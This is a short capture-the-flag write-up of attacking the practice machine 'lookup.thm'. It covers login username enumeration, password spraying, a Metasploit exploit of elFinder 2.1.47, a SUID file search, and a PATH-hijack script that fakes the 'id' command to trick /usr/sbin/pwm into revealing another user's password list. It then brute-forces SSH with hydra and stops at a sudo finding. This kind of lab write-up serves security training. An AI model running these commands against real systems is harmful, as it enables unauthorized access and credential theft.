Nmap showed 2 open ports, 22 and 80
by going to 80, it came to login page at "http://lookup.thm"
doing simple creds like admin:admin shows error message that reveals that only the password was incorrect.
making a simple python scripts to run a check if any user have a simple password like "password".

users "admin" and "jose" came back possitive, logged in as jose:password to files.lookup.thm
added the files.lookup.thm to /etc/hosts and found "elFinder 2.1.47" framework,
found an exploit on msfconsole related to it, and logged in as www-data on the machine.
(it was wierd that i could look into /home/think directory )
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
found executing binary "/usr/sbin/pwm"
by looking at the code, it showed me this:

[!] Running 'id' command to extract the username and user ID (UID)idr[-] Error executing id command
uid=%*u(%[^)])[-] Error reading username from id command
[!] ID: %s
/home/%s/.passwords[-] File /home/%s/.passwords not found

the user think had ".passwords" at hes ~
had to impersonate the user by creating the 'id' binary,
export PATH=/tmp:$PATH
cd /tmp ; touch id
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id
chmod +x id

/usr/sbin/pwm    --> reveals a password list at 'think' home directory.

hydra -l think -P passlist ssh://lookup.thm
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)

'sudo -l' reveals --> (ALL) /usr/bin/look
